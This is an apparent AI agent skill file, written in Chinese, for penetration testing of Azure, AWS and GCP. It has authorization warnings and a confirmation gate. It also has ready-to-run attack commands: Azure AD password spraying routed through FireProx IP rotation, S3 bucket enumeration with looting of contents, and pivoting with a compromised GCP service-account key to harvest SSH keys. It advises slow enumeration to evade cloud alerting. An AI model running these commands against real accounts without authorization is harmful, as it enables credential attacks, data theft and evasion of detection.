---
name: cloud-penetration-testing
description: "对 Microsoft Azure、Amazon Web Services (AWS) 和 Google Cloud Platform (GCP) 的云基础设施进行全面的安全评估。"
risk: offensive
source: community
author: zebbern
date_added: "2026-02-27"
---

> **⚠️ 仅授权使用**
> 此技能仅用于教育目的或授权的安全评估。
> 在使用此工具前，您必须获得系统所有者的明确书面许可。
> 滥用此工具是违法的，严格禁止。

> **强制确认门槛**
> 在运行任何探测、利用、改变、持久化、从目标提取数据或尝试凭据访问的命令前：
> 1. 要求用户说明确切的目标 URL、IP、账户或资源。
> 2. 要求用户确认书面授权和允许的范围。
> 3. 显示确切的命令并解释其预期效果。
> 4. 等待当前对话中的明确确认。
>
> 没有该确认，保持只读并仅提供防御性指导。优先选择沙箱、可弃用的 VM 或受控实验室。

> 仅授权使用：仅在授权的安全评估、防御性验证或受控教育环境中使用此技能。

# 云渗透测试

## 详细指南

在执行此技能前，请阅读[详细指南](references/detailed-guide.md)。它保留了完整的程序和参考资料。将其安全性、前提条件和验证要求视为强制性的。对于专注的工作，加载相关部分；对于端到端工作，完全阅读指南。

## 前提条件

### 所需工具
```bash
# Azure 工具
Install-Module -Name Az -AllowClobber -Force
Install-Module -Name MSOnline -Force
Install-Module -Name AzureAD -Force

# AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install

# GCP CLI
tmpdir="$(mktemp -d)"
trap 'rm -rf "$tmpdir"' EXIT
curl -fsSLo "$tmpdir/google-cloud-sdk-install.sh" https://sdk.cloud.google.com
cat "$tmpdir/google-cloud-sdk-install.sh"  # 在执行前查看完整的安装程序
bash "$tmpdir/google-cloud-sdk-install.sh"
gcloud init

# 附加工具
pip install scoutsuite pacu
```

### 所需知识
- 云架构基础
- 身份和访问管理 (IAM)
- API 身份验证机制
- DevOps 和自动化概念

### 所需访问
- 测试的书面授权
- 测试凭据或访问令牌
- 明确的范围和交战规则

## 约束和限制

### 法律要求
- 仅在获得明确书面授权的情况下进行测试
- 尊重云账户之间的范围边界
- 不要访问生产客户数据
- 文档化所有测试活动

### 技术限制
- MFA 可能会阻止基于凭据的攻击
- 条件访问策略可能会限制访问
- CloudTrail/Activity Logs 记录所有 API 调用
- 某些资源需要特定的区域访问

### 检测考虑
- 云提供者记录所有 API 活动
- 异常访问模式触发警报
- 使用缓慢、有意的枚举
- 考虑 GuardDuty、Security Center、Cloud Armor

## 示例

### 示例 1：Azure 密码喷洒

**场景：** 测试 Azure AD 密码策略

```powershell
# 使用 MSOLSpray 配合 FireProx 进行 IP 轮换
# 首先创建 FireProx 端点
python fire.py --access_key <key> --secret_access_key <secret> --region us-east-1 --url https://login.microsoft.com --command create

# 喷洒密码
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\users.txt -Password "Spring2024!" -URL https://<api-gateway>.execute-api.us-east-1.amazonaws.com/fireprox
```

### 示例 2：AWS S3 存储桶枚举

**场景：** 查找和访问配置错误的 S3 存储桶

```bash
# 列出所有存储桶
aws s3 ls | awk '{print $3}' > buckets.txt

# 检查每个存储桶的内容
while read bucket; do
    echo "Checking: $bucket"
    aws s3 ls s3://$bucket 2>/dev/null
done < buckets.txt

# 下载有趣的存储桶
aws s3 sync s3://misconfigured-bucket ./loot/
```

### 示例 3：GCP 服务账户受损

**场景：** 使用受损的服务账户进行透视

```bash
# 使用服务账户密钥进行身份验证
gcloud auth activate-service-account --key-file compromised-sa.json

# 列出可访问的项目
gcloud projects list

# 枚举计算实例
gcloud compute instances list --project target-project

# 检查元数据中的 SSH 密钥
gcloud compute project-info describe --project target-project | grep ssh

# SSH 到实例
gcloud beta compute ssh instance-name --zone us-central1-a --project target-project
```

## 何时使用
此技能适用于执行概览中描述的工作流或操作。
